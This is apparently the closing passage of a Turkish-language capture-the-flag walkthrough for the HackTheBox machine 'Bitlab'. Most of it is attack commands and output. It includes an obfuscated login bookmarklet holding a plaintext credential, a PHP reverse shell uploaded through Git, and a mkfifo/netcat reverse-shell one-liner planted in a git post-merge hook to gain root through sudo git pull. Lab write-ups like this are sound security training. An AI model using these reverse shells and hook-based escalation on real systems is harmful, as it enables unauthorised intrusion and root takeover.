+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">javascript</span><span class="p">:(</span><span class="kd">function</span><span class="p">(){</span> <span class="kd">var</span> <span class="nx">_0x4b18</span><span class="o">=</span><span class="p">[</span><span class="dl">"</span><span class="s2">value</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">user_login</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">getElementById</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">clave</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">user_password</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">11des0081x</span><span class="dl">"</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">4</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span> <span class="p">})()</span>
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------</span>
+<span class="c"># Git sayfasında New file ile reverse shell.php dosyası oluşturulmuştur. Ayrıca 10.10.10.114/profile/shell.php şeklinde shell çağırılabilir.</span>
+<span class="nt">---------------------------------------------------------------------------------------------------------------------------------------------------------</span>
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  curl <span class="nt">-s</span> 10.10.10.114/profile/shell.php 
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  nc <span class="nt">-lvp</span> 1234
+listening on <span class="o">[</span>any] 1234 ...
+10.10.10.114: inverse host lookup failed: Unknown host
+connect to <span class="o">[</span>10.10.14.23] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.114] 56274
+Linux bitlab 4.15.0-29-generic <span class="c">#31-Ubuntu SMP Tue Jul 17 15:39:52 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 19:18:17 up 22 min,  0 <span class="nb">users</span>,  load average: 0.82, 0.36, 0.27
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+</span></code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on bitlab:
+    env_reset, <span class="nv">exempt_group</span><span class="o">=</span><span class="nb">sudo</span>, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User www-data may run the following commands on bitlab:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/git pull
+<span class="nv">$ </span>
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span> <span class="nb">cp</span> <span class="nt">-R</span> /var/www/html/.git /tmp/
+<span class="nv">$ </span> <span class="nb">echo</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4321 &gt;/tmp/f"</span> <span class="o">&gt;</span> .git/hooks/post-merge
+<span class="nv">$ </span> <span class="nb">chmod </span>777 .git/hooks/post-merge
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">----------------------------------------------------------------------------------------------------------------</span>
+<span class="c"># Bu aşamada panelden yeni bir repo oluşturularak merge edilir. </span>
+<span class="nt">----------------------------------------------------------------------------------------------------------------</span>
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/git pull
+From ssh://localhost:3022/root/profile
+   cbbb89c..0cef591  master     -&gt; origin/master
+ <span class="k">*</span> <span class="o">[</span>new branch]      patch-4    -&gt; origin/patch-4
+Updating cbbb89c..0cef591
+Fast-forward
+ sdzvzcx | 1 +
+ 1 file changed, 1 insertion<span class="o">(</span>+<span class="o">)</span>
+ create mode 100644 sdzvzcx
+<span class="nb">rm</span>: cannot remove <span class="s1">'/tmp/f'</span>: No such file or directory
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  nc <span class="nt">-lvp</span> 4321
+listening on <span class="o">[</span>any] 4321 ...
+10.10.10.114: inverse host lookup failed: Unknown host
+connect to <span class="o">[</span>10.10.14.23] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.114] 55332
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+# whoami
+root
+# wc -c /root/root.txt
+33 /root/root.txt
+# 
+</span></code></pre></div></div>
+
+<h1 id="author-sectiontext">Author <a href=" https://twitter.com/SectionText">SectionText</a></h1>
+<hr />
+
+
+    </main><footer>
+  Bize Yazın <a href="mailto://7r157@protonmail.com">Mail</a>
+</footer>
+</div>
+  </body>
+</html>
